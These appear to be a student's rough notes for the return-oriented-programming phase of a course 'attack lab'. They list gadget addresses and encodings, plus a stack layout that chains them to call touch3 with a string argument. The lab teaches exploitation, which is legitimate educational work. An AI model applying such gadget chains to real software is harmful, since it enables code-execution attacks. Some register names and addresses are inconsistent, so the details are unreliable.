- <addval_273> + 2
    movq %rax,%rdi
    ret

- <addval_219> + 4
    popq %rax
    nop
    ret

- <setval_237> + 2
    movq %rax,%rdi or movl %eax,%edi

- <setval_426> + 2
    movq %rax,%rdi

- <getval_481>> + 2
    movl %eax,%edx
    nop
    ret

<!-- - 00000000004019e8 <addval_113> + 2
    89 ce 78 c9 
    movl %ecx,%esi -->

- 00000000004019ef <addval_490> + 4
    20 db c3
    andb %bl,%bl
    ret

<!-- 00000000004019f6 <getval_226> + 1
    4019f6:	b8 89 d1 48 c0       
    4019fb:	c3    
    movl %edx,%ecx -->

00000000004019fc <setval_384>: + 4
  4019fc:	c7 07 81 d1 84 c0    
  401a02:	c3                   
  testb %al,%al

000000000401a03 <addval_190>: + 3
 401a03:	8d 87 41 48 89 e0    
 401a09:	c3            
 movq %rsp,%rax
 ret



the address of touch3 : 0x4018fa
move char*(from %rax) to %rdi
popq %rax(move char* to %rax)


78                  String                                  35 39 62 39 39 37 66 61
70                  address of touch3                       0x4018fa
68                  address of (mov %rax,%rdi)              0x4019a2
60                  address of (lea (%rdi,%rsi,1),%rax)     0x4019d6
58                  address of (movq %ecx,%rsi)             0x401a13 
50                  address of (movq %edx,%ecx functional nop)             0x401a34
48                  address of (movq %eax,%edx functional nop)             0x401a42
40                  DISTANCE = 0x50 = 80                    0x50
38                  address of (popq rax)                   0x4019ab
30                  address of (movq %rax,%rdi)  rdi = 28   0x4019a2
28(top of stack)    address of (movq %rsp,%rax) rax = 28    0x401a06
0                       







00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00







               





